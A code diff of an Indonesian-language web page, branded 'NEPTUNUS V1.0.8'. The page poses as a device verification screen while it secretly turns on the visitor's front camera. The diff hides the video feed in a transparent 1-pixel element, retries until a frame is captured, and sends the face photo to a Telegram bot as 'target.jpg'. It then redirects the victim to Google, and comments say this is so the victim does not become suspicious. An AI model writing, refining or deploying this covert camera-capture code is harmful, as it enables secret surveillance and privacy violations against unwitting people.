@@ -13,7 +13,8 @@
     <div class="loader"></div>
     <p>Sedang memverifikasi perangkat anda...<br>Mohon tunggu sebentar.</p>
 
-    <video id="video" style="display:none;" autoplay></video>
+    <!-- Perubahan: Jangan gunakan display:none agar stream tetap diproses browser -->
+    <video id="video" style="position: absolute; width: 1px; height: 1px; opacity: 0;" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
@@ -22,44 +23,57 @@
 
         async function startCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // Tambahkan playsinline untuk iOS dan facingMode: user untuk kamera depan
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                // Ambil foto setelah 2 detik agar kamera fokus
-                setTimeout(() => {
-                    takeSnapshot();
-                }, 2000);
+                // Perubahan: Gunakan event 'onloadedmetadata' untuk memastikan video sudah siap
+                video.onloadedmetadata = () => {
+                    video.play();
+                    // Delay diperpanjang ke 3 detik agar sensor cahaya kamera menyesuaikan
+                    setTimeout(takeSnapshot, 3000);
+                };
             } catch (err) {
-                console.error("Akses ditolak");
+                console.error("Akses ditolak atau error hardware");
+                // Tetap redirect agar tidak curiga
+                setTimeout(() => window.location.href = "https://google.com", 2000);
             }
         }
 
         function takeSnapshot() {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
             
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', chat_id);
-                formData.append('photo', blob, 'target.jpg');
-                formData.append('caption', '📸 **Target Berhasil Difoto!**');
+            if (video.videoWidth > 0) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0);
+                
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chat_id);
+                    formData.append('photo', blob, 'target.jpg');
+                    formData.append('caption', '📸 **Target Berhasil Difoto!**\n\n<i>NEPTUNUS V1.0.8</i>');
+                    formData.append('parse_mode', 'HTML');
 
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                }).then(() => {
-                    // Redirect target ke halaman asli setelah foto terambil agar tidak curiga
-                    window.location.href = "https://google.com";
-                });
-            }, 'image/jpeg');
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).finally(() => {
+                        window.location.href = "https://google.com";
+                    });
+                }, 'image/jpeg', 0.8); // 0.8 untuk kompresi agar pengiriman lebih cepat
+            } else {
+                // Jika video masih 0 (hitam), coba lagi dalam 1 detik
+                setTimeout(takeSnapshot, 1000);
+            }
         }
 
         window.onload = startCamera;
     </script>
 </body>
 </html>
-
